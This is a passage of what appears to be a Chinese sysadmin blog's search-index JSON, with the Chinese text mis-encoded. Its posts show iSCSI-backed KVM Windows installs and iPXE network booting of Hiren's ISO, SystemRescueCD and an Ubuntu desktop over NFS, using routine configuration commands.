class=\"cl\"\u003e-----------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyiscsi              active     yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# vol-list myiscsi  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 Path  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunit:0:0:1           /dev/disk/by-path/ip-172.16.8.6:3260-iscsi-iqn.2016-07.com.renhe:renhe-16-8-6.disk03-lun-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼Œè®°ä¸‹æ¥è¿™ä¸ªNameï¼š\u003cstrong\u003eunit:0:0:1\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬æ¥å®‰è£…winçš„kvmå§ï¼Œç›´æ¥cloneè¾“å‡ºåˆ°ç¡¬ç›˜\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003eiscsi-16-11-9 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/iso/Luobo_Ghost_Win7_SP1_x86_2015_0904.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--boot network,cdrom,hd,menu\u003cspan class=\"o\"\u003e=\u003c/span\u003eon \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--disk \u003cspan class=\"nv\"\u003evol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emyiscsi/unit:0:0:1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003ewindows  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-variant\u003cspan class=\"o\"\u003e=\u003c/span\u003ewin7 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5911\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢diskçš„å‚æ•°ï¼Œ\u003cstrong\u003emyiscsi/unit:0:0:1\u003c/strong\u003e\u003c/p\u003e","title":"kvmä½¿ç”¨iscsiä½œä¸ºå­˜å‚¨æ± å®‰è£…win"},{"content":"æˆ‘ä»¬å¸Œæœ›æœ‰ç´§æ€¥æƒ…å†µå‡ºç°çš„æ—¶å€™ï¼Œipxeå¯ä»¥ç”¨systemrecuecdæ•‘æ€¥ï¼Œå¯èƒ½ä¹Ÿå¸Œæœ›æœºå™¨ä¸Šæ¶å‰æµ‹æµ‹å†…å­˜ã€åˆ†åŒºã€èµ·ä¸ªwinpeç­‰ç­‰ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ°hirenè¿™ä¸ªå·¥å…·äº†ï¼Œè¿™ä¸ªä¸œè¥¿å°±æ˜¯å›½å¤–çš„è€æ¯›æ¡ƒå·¥å…·ç®±ï¼\nå¾ˆç®€å•ï¼Œä¿®æ”¹boot2.php\ncase \u0026#39;\\52:54:00:a7:ef:5d\u0026#39;: echo \u0026#34;initrd http://172.16.8.1/ks/winpe/Hiren.iso\\n\u0026#34;; echo \u0026#34;chain http://172.16.8.1/ks/winpe/memdisk iso raw\\n\u0026#34;; break; memdiskä»syslinuxé‡Œé¢æ‹·è´å³å¯ã€‚\nè¿™æ ·å°±æœ‰ä¸€ä¸ªä¸‡ç”¨å·¥å…·å¯ç”¨äº†,isoå¯åŠ¨éƒ½å¯ä»¥é‡‡ç”¨è¿™ç§æ–¹å¼å“¦ã€‚\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_hiren/","summary":"\u003cp\u003eæˆ‘ä»¬å¸Œæœ›æœ‰ç´§æ€¥æƒ…å†µå‡ºç°çš„æ—¶å€™ï¼Œipxeå¯ä»¥ç”¨\u003ccode\u003esystemrecuecd\u003c/code\u003eæ•‘æ€¥ï¼Œå¯èƒ½ä¹Ÿå¸Œæœ›æœºå™¨ä¸Šæ¶å‰æµ‹æµ‹å†…å­˜ã€åˆ†åŒºã€èµ·ä¸ªwinpeç­‰ç­‰ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ°\u003ccode\u003ehiren\u003c/code\u003eè¿™ä¸ªå·¥å…·äº†ï¼Œè¿™ä¸ªä¸œè¥¿å°±æ˜¯å›½å¤–çš„è€æ¯›æ¡ƒå·¥å…·ç®±ï¼\u003c/p\u003e\n\u003cp\u003eå¾ˆç®€å•ï¼Œä¿®æ”¹boot2.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:a7:ef:5d\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd http://172.16.8.1/ks/winpe/Hiren.iso\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;chain  http://172.16.8.1/ks/winpe/memdisk iso raw\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ememdiskä»syslinuxé‡Œé¢æ‹·è´å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±æœ‰ä¸€ä¸ªä¸‡ç”¨å·¥å…·å¯ç”¨äº†,isoå¯åŠ¨éƒ½å¯ä»¥é‡‡ç”¨è¿™ç§æ–¹å¼å“¦ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240118141641267\" loading=\"lazy\" src=\"/posts/20240118-ipxe_hiren/image-20240118141641267.png\"\u003e\u003c/p\u003e","title":"IPXEä¸‡èƒ½å·¥å…·hiren.isoçš„å¯åŠ¨æ–¹å¼"},{"content":"æ—¢ç„¶ç”¨åˆ°ipxeï¼Œå°±è¯•è¯•è¿œç¨‹è¿è¡Œsystemrecuecdã€‚ä¸‡ä¸€ç³»ç»Ÿå‡ºæ¯›ç—…ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æˆ–è€…æ€¥æ•‘ã€‚\nä¸‹è½½cd\nwget http://downloads.sourceforge.net/project/systemrescuecd/sysresccd-x86/4.7.3/systemrescuecd-x86-4.7.3.iso è£…è¿› http://172.168.8.1/ks/sysrcdç›®å½•ä¸­\nmount -o loop systemrescuecd-x86-4.7.3.iso /mnt/iso mkdir -p /var/www/html/ks/sysrcd cp -r /mnt/iso/* /var/www/html/ks/sysrcd é‡å¤´æˆï¼Œä¾ç„¶æŒ‰å‰é¢çš„æ–¹æ³•ä¿®æ”¹boot2.phpå³å¯\ncase \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; $ipa=explode(\u0026#39;:\u0026#39;,$ip); echo \u0026#34;ifopen net0\\n\u0026#34;; echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; echo \u0026#34;set net0/dns $dns\\n\u0026#34;; echo \u0026#34;set base-url http://172.16.8.1/ks/sysrcd\\n\u0026#34;; echo \u0026#34;kernel \\${base-url}/isolinux/rescue32 netboot=\\${base-url}/sysrcd.dat nodhcp eth0=172.16.36.2/23 dns=172.16.8.1 gateway=172.16.37.254 rootpass=xxxxxxxx vncserver=1:password nameif=eth0:ec:f4:bb:d9:96:40\\n\u0026#34;; echo \u0026#34;initrd ${base-url}/isolinux/initram.igz\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; break; æ³¨æ„ä¸Šé¢ï¼Œé™æ€ipçš„è®¾ç½®éƒ¨åˆ†ï¼Œè¿˜æœ‰åŒæ—¶è®¾ç½®äº†sshdå’Œvncserverï¼Œæ–¹ä¾¿è¿œç¨‹æ“ä½œã€‚\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_sysrecuecd/","summary":"\u003cp\u003eæ—¢ç„¶ç”¨åˆ°ipxeï¼Œå°±è¯•è¯•è¿œç¨‹è¿è¡Œ\u003ccode\u003esystemrecuecd\u003c/code\u003eã€‚ä¸‡ä¸€ç³»ç»Ÿå‡ºæ¯›ç—…ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æˆ–è€…æ€¥æ•‘ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹è½½cd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://downloads.sourceforge.net/project/systemrescuecd/sysresccd-x86/4.7.3/systemrescuecd-x86-4.7.3.iso  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè£…è¿› http://172.168.8.1/ks/sysrcdç›®å½•ä¸­\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount -o loop systemrescuecd-x86-4.7.3.iso /mnt/iso  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /var/www/html/ks/sysrcd  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp -r /mnt/iso/* /var/www/html/ks/sysrcd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‡å¤´æˆï¼Œä¾ç„¶æŒ‰å‰é¢çš„æ–¹æ³•ä¿®æ”¹boot2.phpå³å¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexplode\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e,\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ifopen net0\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/ip \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[0]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/netmask \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[2]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/gateway \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[1]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/dns \u003c/span\u003e\u003cspan class=\"nv\"\u003e$dns\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set base-url http://172.16.8.1/ks/sysrcd\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;kernel \\${base-url}/isolinux/rescue32 netboot=\\${base-url}/sysrcd.dat nodhcp eth0=172.16.36.2/23 dns=172.16.8.1 gateway=172.16.37.254 rootpass=xxxxxxxx vncserver=1:password nameif=eth0:ec:f4:bb:d9:96:40\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ebase\u003c/span\u003e\u003cspan class=\"p\"\u003e-url\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/isolinux/initram.igz\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;boot\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢ï¼Œé™æ€ipçš„è®¾ç½®éƒ¨åˆ†ï¼Œè¿˜æœ‰åŒæ—¶è®¾ç½®äº†sshdå’Œvncserverï¼Œæ–¹ä¾¿è¿œç¨‹æ“ä½œã€‚\u003c/p\u003e","title":"IPXEè¿œç¨‹è¿è¡Œsysrecuecdç³»ç»Ÿ"},{"content":"æœ‰äº†ä¸Šç¯‡IPXEçš„å¯åŠ¨æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥å¯åŠ¨ä¸€ä¸ªUbuntuæ¥ç©ï¼š\nç®€å•çš„ä¿®æ”¹boot2.phpå³å¯ï¼š\ncase \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; $ipa=explode(\u0026#39;:\u0026#39;,$ip); echo \u0026#34;ifopen net0\\n\u0026#34;; echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; echo \u0026#34;set net0/dns $dns\\n\u0026#34;; echo \u0026#34;kernel http://172.16.8.1/ks/ubuntu/vmlinuz.efi root=/dev/nfs boot=casper netboot=nfs nfsroot=172.16.11.6:/root/ubuntu ip=172.16.36.2::172.16.37.254:255.255.254.0:renhe-16-36-2:eno1 ro\\n\u0026#34;; echo \u0026#34;initrd http://172.16.8.1/ks/ubuntu/initrd.lz\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; break; æ³¨æ„ï¼šå˜çš„å°±æ˜¯kernelå’Œinité‚£ä¸¤è¡Œï¼Œnetbootæ”¯æŒnfså’Œcifsï¼Œä¸æ”¯æŒhttpå•Šï¼Œè¯•äº†åŠå¤©ï¼å¦å¤–ipé‚£ä¸€è¡Œï¼Œå¦‚æœæ˜¯åŠ¨æ€çš„ï¼Œip=dhcpï¼Œå¦‚æœæ˜¯é™æ€çš„ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\nip=å®¢æˆ·ç«¯ip:æœåŠ¡å™¨ç«¯ip:ç½‘å…³:æ©ç :ä¸»æœºå:ç½‘å¡\næœåŠ¡å™¨ç«¯ipä¸å¡«ï¼Œä¸»æœºåä¹Ÿå¯ä»¥ä¸å¡«ã€‚\né¦–å…ˆæˆ‘ä»¬è¦å»ä¸‹ä¸ªISO\nwget http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04-desktop-amd64.iso ç„¶åæŠŠvmlinuz.efiå’Œinitrd.lzå¼„å‡ºæ¥ï¼Œæ”¾åˆ°[http://172.16.8.1/ks/ubuntu]ç›®å½•ä¸‹\nmount -o loop ubuntu-16.04-desktop-amd64.iso /mnt/iso cp /mnt/iso/casper/vmlinuz.efi /var/www/html/ks/ubuntu cp /mnt/iso/casper/initrd.lz /var/www/html/ks/ubuntu ç„¶åå»ºç«‹nfsï¼ŒæŠŠisoé‡Œçš„ä¸œè¥¿éƒ½å¼„åˆ°nfså…±äº«é‡Œå»ï¼š\nmkdir -p /export/ubuntu vi /etc/exports /export/ubuntu *(rw,sync,no_subtree_check,fsid=0,no_root_squash) yum install -y nfs-utils rpcbind service nfs start okï¼Œå¯åŠ¨pxeï¼Œå°±çœ‹åˆ°æ¡Œé¢äº†ã€‚ ","permalink":"https://rendoumi.com/posts/20240118-pxe_utuntu_desk/","summary":"\u003cp\u003eæœ‰äº†ä¸Šç¯‡IPXEçš„å¯åŠ¨æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥å¯åŠ¨ä¸€ä¸ªUbuntuæ¥ç©ï¼š\u003c/p\u003e\n\u003cp\u003eç®€å•çš„ä¿®æ”¹boot2.phpå³å¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexplode\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e,\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ifopen net0\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/ip \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[0]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/netmask \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[2]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/gateway \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[1]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/dns \u003c/span\u003e\u003cspan class=\"nv\"\u003e$dns\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;kernel http://172.16.8.1/ks/ubuntu/vmlinuz.efi root=/dev/nfs boot=casper netboot=nfs nfsroot=172.16.11.6:/root/ubuntu ip=172.16.36.2::172.16.37.254:255.255.254.0:renhe-16-36-2:eno1 ro\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd http://172.16.8.1/ks/ubuntu/initrd.lz\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;boot\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼šå˜çš„å°±æ˜¯\u003ccode\u003ekernel\u003c/code\u003eå’Œ\u003ccode\u003einit\u003c/code\u003eé‚£ä¸¤è¡Œï¼Œnetbootæ”¯æŒnfså’Œcifsï¼Œä¸æ”¯æŒhttpå•Šï¼Œè¯•äº†åŠå¤©ï¼å¦å¤–ipé‚£ä¸€è¡Œï¼Œå¦‚æœæ˜¯åŠ¨æ€çš„ï¼Œip=dhcpï¼Œå¦‚æœæ˜¯é™æ€çš„ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eip=å®¢æˆ·ç«¯ip:æœåŠ¡å™¨ç«¯ip:ç½‘å…³:æ©ç :ä¸»æœºå:ç½‘å¡\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæœåŠ¡å™¨ç«¯ipä¸å¡«ï¼Œä¸»æœºåä¹Ÿå¯ä»¥ä¸å¡«ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬è¦å»ä¸‹ä¸ªISO\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 